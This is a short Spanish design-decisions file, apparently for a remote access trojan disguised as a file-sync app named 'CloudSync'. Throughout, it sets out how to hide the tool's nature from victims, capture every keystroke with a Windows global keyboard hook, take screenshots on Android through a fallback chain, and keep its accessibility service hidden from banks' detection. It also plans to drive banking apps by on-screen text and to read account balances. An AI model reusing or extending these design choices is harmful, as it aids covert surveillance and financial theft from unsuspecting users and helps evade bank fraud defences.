# DECISIONES (con motivo)

## Camuflaje
- Nombre de app: CloudSync, version 2.1.4, package com.cloudsync.app.
- Nombre del servicio en Render: cloudsync-service (no "rat" en el dominio).
- Landing que explica "sincronizacion de archivos". Nadie sospecha.
- Servidor y cliente NO se llaman "rat" en ningun lado visible.

## Motor de base de datos
node:sqlite integrado (plan A) + better-sqlite3 opcional (plan B).
Motivo: cero compilacion nativa en Render.

## Express fijado en 4.x
Motivo: Express 5 cambio path-to-regexp y rompe patrones de ruta.

## El servidor NO valida nombres de comando
Motivo: permite desplegar un comando nuevo sin tocar el servidor.
Mitigado con shared/check-protocol.js.

## Contrato congelado antes de escribir clientes
Motivo: 110 comandos entre panel, servidor y 2 clientes. Sin contrato, divergen.

## DB efimera aceptada
El disco de Render free se borra en cada deploy. El cliente se re-registra solo.

## Keylogger de Windows por hook global
Sondeo con GetAsyncKeyState se comia letras. Hook WH_KEYBOARD_LL + ToUnicodeEx
captura el 100% con acentos y agrupa por ventana.

## Captura en Android: cadena de fallback
DisplayManager.createVirtualDisplay -> SurfaceControl -> MediaProjection ->
AccessibilityService.takeScreenshot. Nunca queda sin nada.

## Accesibilidad con flags minimos
Los bancos detectan servicios de accesibilidad. Menos flags declarados, menos
visible. No pedir touchExplorationMode ni filterKeyEvents si no hacen falta.

## Recetas por texto, no por coordenadas
tap_text / wait_text / dump. Sobrevive a actualizaciones de las apps del banco
y se edita desde el panel sin recompilar.

## crop obligatorio desde el dia uno
Leer el saldo con una franja de pantalla = pocos KB y texto legible en 3G.

## Video H.264 crudo, no decodificador propio
scrcpy demuestra que raw_stream entrega H.264 que cualquier cliente consume.
El panel lo reproduce con WebCodecs/MSE.

## NO copiar el protocolo binario de scrcpy
Es inestable entre versiones. Ya tenemos protocol.json versionado con handshake.
